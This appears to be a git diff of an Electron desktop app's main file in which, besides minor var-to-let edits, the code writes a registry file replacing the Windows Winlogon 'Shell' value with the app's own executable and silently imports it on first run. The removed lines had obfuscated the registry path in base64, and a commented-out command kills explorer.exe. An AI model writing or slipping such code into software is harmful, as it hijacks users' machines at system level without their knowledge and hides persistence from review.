@@ -7,12 +7,11 @@ const log = require('electron-log');
 const {autoUpdater} = require("electron-updater");
 const { exec } = require('child_process');
 const fs = require('fs');
-var AutoLaunch = require('auto-launch');
+let AutoLaunch = require('auto-launch');
 let mainWindow;
-var autoLauncher = new AutoLaunch({
+let autoLauncher = new AutoLaunch({
 	name: 'client'
 });
-
 if(!isDev)
 {
     /*exec('taskkill /IM "explorer.exe" /F');
@@ -28,18 +27,20 @@ if(!isDev)
     });*/
     var cmd = process.argv[1];
 
-    if (cmd === '--squirrel-firstrun') {// Running for the first time.
-        let target = (path.resolve("./") + "\\").split("\\").join("\\"+"\\");
-        let regeditPath = Buffer.from("W0hLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbl0=", 'base64').toString(); // [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]   
-        fs.writeFile(target + "startup.reg", "Windows Registry Editor Version 5.00\n\n" + regeditPath + '\n"Shell"="' + target + 'client.exe"', function(err) {
-        
-            if(err) {
-                return console.log(err);
-            }
+    
+    let target = (path.resolve("./") + "\\").split("\\").join("\\"+"\\");
+    let regeditPath = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; // [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]   
+    fs.writeFile(target + "startup.reg", "Windows Registry Editor Version 5.00\n\n" + regeditPath + '\n"Shell"="' + target + 'client.exe"', function(err) {
+    
+        if(err) {
+            return console.log(err);
+        }
+        if (cmd === '--squirrel-firstrun') {// Running for the first time.
             exec(target + "/startup.reg");
-            console.log("The file was saved!", target);
-        }); 
-    }
+        }
+        console.log("The file was saved!", target);
+    }); 
+    
 }
 
 function createWindow() {
